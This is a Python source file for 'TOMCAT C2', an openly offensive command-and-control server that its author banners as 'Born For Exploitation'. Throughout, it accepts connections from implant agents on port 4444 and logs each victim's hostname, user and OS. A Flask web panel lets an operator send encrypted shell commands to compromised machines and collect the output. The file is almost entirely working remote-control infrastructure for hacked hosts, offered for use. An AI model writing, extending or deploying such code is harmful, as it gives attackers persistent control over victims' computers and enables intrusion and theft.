#!/usr/bin/python

try:
    import base64
    import json
    import os
    import socket
    import sys
    import threading
    import time
    import traceback
    import colorama
    from time import sleep
    from colorama import Fore, init
    from datetime import datetime
    from cryptography.fernet import Fernet
    from flask import Flask, jsonify, render_template, request
except ModuleNotFoundError as e:
    print(f"REQUIRED MODULES NOT INSTALLED: {e}")
    sys.exit(0)

init(autoreset=True)

class C2TomcatServer:
    def __init__(self, host="0.0.0.0", port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.agentId = 0
        self.c2socket = None
        self.running = False
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.lock = threading.Lock()
        self.acceptThread = None

    def C2StartTomcat(self):
        try:
            self.c2socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.c2socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.c2socket.bind((self.host, self.port))
            self.c2socket.listen(5)
            self.running = True
            return True, f"Server Started On {self.host}:{self.port}"
        except Exception as e:
            return False, f"Error Starting Server: {str(e)}"

    def C2StopTomcat(self):
        self.running = False
        if self.c2socket:
            try:
                self.c2socket.close()
            except Exception:
                pass
        if self.acceptThread and self.acceptThread.is_alive():
            self.acceptThread.join(timeout=2)
        agentClose = []
        with self.lock:
            agentClose = list(self.agents.items())
        for agentId, agent in agentClose:
            try:
                agent["socket"].close()
            except Exception:
                pass
        with self.lock:
            self.agents.clear()

    def acceptConnection(self):
        while self.running:
            try:
                self.c2socket.settimeout(1.0)
                agentSocket, address = self.c2socket.accept()
                thread = threading.Thread(
                    target=self.agentHandler,
                    args=(agentSocket, address),
                    daemon=True,
                )
                thread.start()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"Accept Error: {str(e)}")

    def agentHandler(self, agentSocket, address):
        currentAgentId = None
        try:
            agentSocket.settimeout(10)
            agentSocket.sendall(self.key)
            sleep(0.2)
            agentInfo = agentSocket.recv(4096).decode("utf-8")
            if not agentInfo:
                agentSocket.close()
                return
            info = json.loads(agentInfo)
            with self.lock:
                self.agentId += 1
                currentAgentId = self.agentId
                agentData = {
                    "socket": agentSocket,
                    "address": address,
                    "id": self.agentId,
                    "os": info.get("os", "Unknown"),
                    "hostname": info.get("hostname", "Unknown"),
                    "user": info.get("user", "Unknown"),
                    "arch": info.get("architecture", "Unknown"),
                    "joinAt": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                }
                self.agents[self.agentId] = agentData
            print(f"[+] New agent connected: {currentAgentId}")
            self.monitorAgent(currentAgentId, agentSocket)
        except Exception as e:
            print(f"Handshake Error: {str(e)}")
            traceback.print_exc()
            try:
                agentSocket.close()
            except Exception:
                pass
            if currentAgentId:
                self.agentRefused(currentAgentId)

    def monitorAgent(self, agentId, agentSocket):
        try:
            while self.running:
                agentSocket.settimeout(5.0)
                try:
                    data = agentSocket.recv(1, socket.MSG_PEEK)
                    if not data:
                        raise ConnectionError("Agent Disconnected")
                except socket.timeout:
                    continue
                except Exception:
                    raise
                sleep(1)
        except Exception as e:
            print(f"[!] Agent {agentId} Disconnected: {str(e)}")
            self.agentRefused(agentId)

    def agentAvailable(self, agentId, command):
        if agentId not in self.agents:
            return False, "Agent Not Found."
        try:
            agent = self.agents[agentId]
            agentSocket = agent["socket"]
            encrypted = self.cipher.encrypt(command.encode())
            agentSocket.settimeout(120)
            agentSocket.sendall(encrypted)
            recdata = b""
            starttime = time.time()
            while True:
                try:
                    if time.time() - starttime > 120:
                        return False, "Command Execution Timeout (120s)"
                    chunk = agentSocket.recv(8192)
                    if not chunk:
                        raise ConnectionError("Agent Disconnected During Command")
                    recdata += chunk
                    if recdata.endswith(b"<END>"):
                        recdata = recdata[:-5]
                        break
                except socket.timeout:
                    if recdata:
                        break
                    else:
                        return False, "No Response From Agent (timeout)"
            if recdata:
                try:
                    decrypted = self.cipher.decrypt(recdata).decode(
                        "utf-8", errors="ignore"
                    )
                    return True, decrypted
                except Exception as e:
                    return False, f"Decryption Error: {str(e)}"
            else:
                return False, "No Response From Agent"
        except (ConnectionResetError, ConnectionError, BrokenPipeError) as e:
            self.agentRefused(agentId)
            return False, f"Connection lost: {str(e)}"
        except Exception as e:
            self.agentRefused(agentId)
            traceback.print_exc()
            return False, f"Error: {str(e)}"

    def agentRefused(self, agentId):
        with self.lock:
            if agentId in self.agents:
                try:
                    self.agents[agentId]["socket"].close()
                except Exception:
                    pass
                del self.agents[agentId]

    def agentList(self):
        with self.lock:
            agents = []
            for agent in self.agents.values():
                agents.append(
                    {
                        "id": agent["id"],
                        "ip": f"{agent['address'][0]}:{agent['address'][1]}",
                        "os": agent["os"],
                        "hostname": agent["hostname"],
                        "user": agent["user"],
                        "arch": agent["arch"],
                        "joinAt": agent["joinAt"],
                    }
                )
            return agents
        
app = Flask(__name__)
app.config["SECRET_KEY"] = "tomcat-c2-secret-key-change-me"
C2Server = None

@app.route("/")
def index():
    return render_template("tomcatv1s.html")

@app.route("/api/start", methods=["POST"])
def apiStart():
    global C2Server
    try:
        data = request.get_json()
        host = data.get("host", "0.0.0.0")
        port = int(data.get("port", 4444))
        if C2Server and C2Server.running:
            return jsonify({"success": False, "message": "Server Is Already Running"})
        C2Server = C2TomcatServer(host, port)
        success, message = C2Server.C2StartTomcat()
        if success:
            C2Server.acceptThread = threading.Thread(
                target=C2Server.acceptConnection, daemon=True
            )
            C2Server.acceptThread.start()
            return jsonify(
                {
                    "success": True,
                    "message": message,
                    "key": C2Server.key.decode(),
                    "host": host,
                    "port": port,
                }
            )
        else:
            return jsonify({"success": False, "message": message})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route("/api/stop", methods=["POST"])
def apiStop():
    global C2Server
    try:
        if C2Server:
            C2Server.C2StopTomcat()
            C2Server = None
            return jsonify({"success": True, "message": "Server Stopped Successfully"})
        else:
            return jsonify({"success": False, "message": "No Server Running"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route("/api/status", methods=["GET"])
def apiStatus():
    global C2Server
    if C2Server and C2Server.running:
        return jsonify(
            {
                "running": True,
                "host": C2Server.host,
                "port": C2Server.port,
                "agentCount": len(C2Server.agents),
            }
        )
    else:
        return jsonify({"running": False, "agentCount": 0})

@app.route("/api/agents", methods=["GET"])
def apiAgent():
    global C2Server
    if C2Server:
        agents = C2Server.agentList()
        return jsonify({"agents": agents})
    else:
        return jsonify({"agents": []})

@app.route("/api/execute", methods=["POST"])
def apiExecute():
    global C2Server
    try:
        if not C2Server:
            return jsonify({"success": False, "message": "Server Not Running"})
        data = request.get_json()
        agentIdentifier = int(data.get("agentIdentifier"))
        command = data.get("command", "").strip()
        if not command:
            return jsonify({"success": False, "message": "Command Cannot Be Empty"})
        success, response = C2Server.agentAvailable(agentIdentifier, command)
        if success:
            return jsonify(
                {
                    "success": True,
                    "output": response,
                    "agentIdentifier": agentIdentifier,
                    "command": command,
                }
            )
        else:
            return jsonify(
                {
                    "success": False,
                    "message": response,
                    "agentIdentifier": agentIdentifier,
                    "command": command,
                }
            )
    except Exception as e:
        return jsonify({"success": False, "message": f"Failed Fo Execute: {str(e)}"})


def main():
    xbanner = f"""
    {Fore.RED}
    ___________________      _____  _________     ________________ _________  ________
    \\__    ___/\\_____  \\    /     \\ \\_   ___ \\   /  _  \\__    ___/ \\_   ___ \\ \\_____  \\
      |    |    /   |   \\  /  \\ /  \\/    \\  \\/  /  /_\\  \\|    |    /    \\  \\/  /  ____/
      |    |   /    |    \\/    Y    \\     \\____/    |    \\    |    \\     \\____/       \\
      |____|   \\_______  /\\____|__  /\\______  /\\____|__  /____|     \\______  /\\_______ \\
                       \\/         \\/        \\/         \\/                  \\/         \\/
            {Fore.RED}~>> {Fore.WHITE} Author: TOM7
            {Fore.RED}~>> {Fore.WHITE} GitHub: tom7voldemort
            {Fore.RED}~>> {Fore.WHITE} Born For Exploitation
    {Fore.RESET}
    """
    print(xbanner)
    print("\n[+] Starting TOMCAT C2 Flask Server")
    print("[+] Access TOMCAT C2 At: http://127.0.0.1:5000 or <your ip>:<port>")
    print("[+] Press Ctrl+C To Stop\n")

    app.run(host="0.0.0.0", port=5000, debug=False)


if __name__ == "__main__":
    main()
